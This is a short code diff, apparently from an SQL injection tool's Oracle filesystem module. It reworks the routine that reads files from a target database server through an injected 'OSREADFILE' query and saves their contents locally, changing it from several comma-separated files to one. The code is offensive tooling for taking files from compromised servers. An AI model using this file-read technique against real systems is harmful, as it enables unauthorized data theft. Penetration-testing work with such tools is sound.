@@ -31,25 +31,24 @@ class Filesystem(GenericFilesystem):
             payload = agent.payload(newValue=query)
             Request.queryPage(payload, content=False, raise404=False, silent=True, noteResponseTime=False)
 
-        for remoteFile in remoteFile.split(','):
-            if not kb.bruteMode:
-                infoMsg = "fetching file: '%s'" % remoteFile
-                logger.info(infoMsg)
+        if not kb.bruteMode:
+            infoMsg = "fetching file: '%s'" % remoteFile
+            logger.info(infoMsg)
 
-            kb.fileReadMode = True
-            fileContent = inject.getValue("SELECT RAWTOHEX(OSREADFILE('%s')) FROM DUAL" % remoteFile, charsetType=CHARSET_TYPE.HEXADECIMAL)
-            kb.fileReadMode = False
+        kb.fileReadMode = True
+        fileContent = inject.getValue("SELECT RAWTOHEX(OSREADFILE('%s')) FROM DUAL" % remoteFile, charsetType=CHARSET_TYPE.HEXADECIMAL)
+        kb.fileReadMode = False
 
-            if not isNoneValue(fileContent):
-                fileContent = decodeDbmsHexValue(fileContent, True)
+        if not isNoneValue(fileContent):
+            fileContent = decodeDbmsHexValue(fileContent, True)
 
-                if fileContent.strip():
-                    localFilePath = dataToOutFile(remoteFile, fileContent)
-                    localFilePaths.append(localFilePath)
+            if fileContent.strip():
+                localFilePath = dataToOutFile(remoteFile, fileContent)
+                localFilePaths.append(localFilePath)
 
-            elif not kb.bruteMode:
-                errMsg = "no data retrieved"
-                logger.error(errMsg)
+        elif not kb.bruteMode:
+            errMsg = "no data retrieved"
+            logger.error(errMsg)
 
         return localFilePaths
 
